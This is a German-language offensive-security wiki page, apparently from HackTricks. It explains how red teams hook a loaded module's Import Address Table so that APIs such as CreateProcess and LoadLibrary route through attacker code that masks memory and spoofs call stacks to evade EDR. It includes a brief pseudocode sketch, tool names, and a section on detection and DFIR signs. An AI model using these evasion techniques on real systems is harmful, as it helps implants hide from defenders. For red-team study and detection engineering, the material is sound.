Red teams können die Runtime‑Evasion aus dem C2‑Implantat in das Zielmodul selbst verlagern, indem sie seine Import Address Table (IAT) hooken und ausgewählte APIs über vom Angreifer kontrollierten, positionsunabhängigen Code (PIC) routen. Dies verallgemeinert die Evasion über die kleine API‑Oberfläche hinaus, die viele Kits exponieren (z. B. CreateProcessA), und erweitert denselben Schutz auf BOFs und post‑exploitation DLLs.

Allgemeiner Ansatz
- Platziere einen PIC‑Blob neben dem Zielmodul mithilfe eines reflective loader (prepended oder companion). Der PIC muss eigenständig und positionsunabhängig sein.
- Während die Host‑DLL geladen wird, durchlaufe ihren IMAGE_IMPORT_DESCRIPTOR und patche die IAT‑Einträge für die anvisierten Imports (z. B. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), sodass sie auf schlanke PIC‑Wrapper zeigen.
- Jeder PIC‑Wrapper führt Evasionsmaßnahmen aus, bevor er per tail‑call die echte API‑Adresse aufruft. Typische Evasionsmaßnahmen sind:
  - Speicher maskieren/de‑maskieren rund um den Aufruf (z. B. Beacon‑Regionen verschlüsseln, RWX→RX, Seitennamen/-berechtigungen ändern) und danach wiederherstellen.
  - Call‑stack spoofing: Konstruiere einen harmlosen Stack und wechsle in die Ziel‑API, sodass die Call‑stack‑Analyse auf erwartete Frames auflöst.
  - Zur Kompatibilität exportiere eine Schnittstelle, damit ein Aggressor‑Script (oder Äquivalent) registrieren kann, welche APIs für Beacon, BOFs und post‑ex DLLs gehookt werden sollen.

Why IAT hooking here
- Funktioniert für jeden Code, der den gehookten Import verwendet, ohne Tool‑Code zu ändern oder darauf zu vertrauen, dass Beacon bestimmte APIs proxyt.
- Deckt post‑ex DLLs ab: Hooking von LoadLibrary* ermöglicht es, Modul‑Ladungen (z. B. System.Management.Automation.dll, clr.dll) abzufangen und dieselbe Maskier‑/Stack‑Evasion auf deren API‑Aufrufe anzuwenden.
- Stellt die zuverlässige Nutzung von prozessstartenden post‑ex Befehlen gegen call‑stack‑basierte Erkennungen wieder her, indem CreateProcessA/W umschlossen wird.

Minimale IAT‑Hook‑Skizze (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Hinweise
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Halte Wrapper klein und PIC‑sicher; ermittele die tatsächliche API über den ursprünglichen IAT‑Wert, den du vor dem Patching erfasst hast, oder über LdrGetProcedureAddress.
- Verwende RW → RX‑Übergänge für PIC und vermeide es, writable+executable Seiten zurückzulassen.

Call‑stack spoofing stub
- Draugr‑style PIC stubs bauen eine gefälschte Aufrufkette auf (Return‑Adressen in harmlose Module) und pivotieren dann in die echte API.
- Das umgeht Detektionen, die kanonische Stacks von Beacon/BOFs zu sensiblen APIs erwarten.
- Kombiniere dies mit stack cutting/stack stitching Techniken, um innerhalb der erwarteten Frames vor dem API‑Prolog zu landen.

Operational integration
- Füge den reflective loader an den Anfang von post‑ex DLLs, sodass PIC und Hooks automatisch initialisiert werden, wenn die DLL geladen wird.
- Verwende ein Aggressor‑Script, um Ziel‑APIs zu registrieren, sodass Beacon und BOFs transparent vom selben Evasion‑Pfad profitieren, ohne Code‑Änderungen.

Detection/DFIR considerations
- IAT‑Integrität: Einträge, die auf non‑image (heap/anon) Adressen auflösen; periodische Überprüfung der Import‑Pointer.
- Stack‑Anomalien: Return‑Adressen, die nicht zu geladenen Images gehören; abrupte Übergänge zu non‑image PIC; inkonsistente RtlUserThreadStart‑Abstammung.
- Loader‑Telemetrie: In‑process Writes to IAT, frühe DllMain‑Aktivität, die Import‑Thunks verändert, unerwartete RX‑Regionen, die beim Laden erzeugt werden.
- Image‑load evasion: if hooking LoadLibrary*, überwache verdächtige Loads von automation/clr Assemblies, die mit memory masking Events korrelieren.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [Microsoft – mklink command reference](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)

- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)

{{#include ../banners/hacktricks-training.md}}
